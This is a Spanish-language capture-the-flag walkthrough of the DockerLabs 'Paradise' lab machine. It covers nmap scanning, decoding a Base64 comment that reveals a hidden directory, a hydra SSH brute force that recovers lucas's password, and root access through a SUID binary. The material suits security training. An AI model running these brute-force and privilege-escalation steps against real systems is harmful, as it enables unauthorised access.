---
icon: linux
---

**Plataforma:** Dockerlabs\
**Sistema Operativo:** Linux

> **Tags:** `Linux` `Web` `SMB` `Base64` `Information Leakage` `Hydra` `SUID`

## INSTALACIÓN

Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.

```bash
unzip paradise.zip
```

La máquina ya está descomprimida y solo falta montarla.

```bash
sudo bash auto_deploy.sh paradise.tar
```

Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.

## ESCANEO DE PUERTOS

A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
```

```bash
nmap -n -Pn -sCV -p22,80,139,445 --min-rate 5000 172.17.0.2
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-05 23:27 CET
Nmap scan report for 172.17.0.2
Host is up (0.000026s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 a1:bc:79:1a:34:68:43:d5:f4:d8:65:76:4e:b4:6d:b1 (DSA)
|   2048 38:68:b6:3b:a3:b2:c9:39:a3:d5:f9:97:a9:5f:b3:ab (RSA)
|   256 d2:e2:87:58:d0:20:9b:d3:fe:f8:79:e3:23:4b:df:ee (ECDSA)
|_  256 b7:38:8d:32:93:ec:4f:11:17:9d:86:3c:df:53:67:9a (ED25519)
80/tcp  open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Andys's House
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: PARADISE)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: PARADISE)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: UBUNTU; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-11-05T22:27:47
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: ae1363a02313
|   NetBIOS computer name: UBUNTU\x00
|   Domain name: \x00
|   FQDN: ae1363a02313
|_  System time: 2025-11-05T22:27:45+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.03 seconds
```

Tenemos abiertos los puertos `22`, `80`, `139` y `445`.

Accedemos a la página web del puerto `80`, encontramos un botón "Go to the paradise" y se nos redirige a una página `gallery.html`.

En el código fuente de `gallery.html` encontramos el siguiente comentario:

```
<!-- ZXN0b2VzdW5zZWNyZXRvCg== -->
```

Todo indica que se trata de una cadena de texto codificada en `Base64`. La decodificamos.

```bash
echo "ZXN0b2VzdW5zZWNyZXRvCg==" | base64 -d
```

Info:

```
estoesunsecreto
```

Intentamos realizar un ataque de `fuerza bruta` contra una lista de `usuarios`, utilizando la cadena decodificada como contraseña, pero no hay suerte.

Al final descubrimos que `estoesunsecreto` se trata de un directorio.

Accedemos a `http://172.17.0.2/estoesunsecreto`.

![alt text](../../.gitbook/assets/lucas.png)

Encontramos dentro un archivo llamado `mensaje_para_lucas.txt`, con el siguiente contenido:

```
REMEMBER TO CHANGE YOUR PASSWORD ACCOUNT, BECAUSE YOUR PASSWORD IS DEBIL AND THE HACKERS CAN FIND USING B.F.
```

El mensaje nos indica que la contraseña de `lucas` es débil y se puede encontrar con `fuerza bruta`.

Así lo hacemos.

```bash
hydra -l lucas -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64
```

Info:

```
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-05 23:38:08
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: lucas   password: chocolate
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-05 23:38:20
```

Encontramos credenciales para el usuario `lucas` : `chocolate`.

Accedemos por `SSH` con dichas credenciales.

```bash
ssh lucas@172.17.0.2
```

## ESCALADA DE PRIVILEGIOS

Una vez dentro, comprobamos permisos `sudo` y `SUID`.

```bash
find / -perm -4000 -type f 2>/dev/null 
```

Info:

```
/bin/umount
/bin/su
/bin/mount
/bin/ping
/bin/ping6
/usr/local/bin/privileged_exec
/usr/local/bin/backup.sh
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/newgrp
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
```

Observamos un binario bastante interesante con nombre `privileged_exec`. Vamos a ejecutarlo para ver exactamente qué es lo que hace.

```bash
/usr/local/bin/privileged_exec
```

Info:

```
Running with effective UID: 0
root@ae1363a02313:~# whoami
root
root@ae1363a02313:~#
```

Ya somos root!
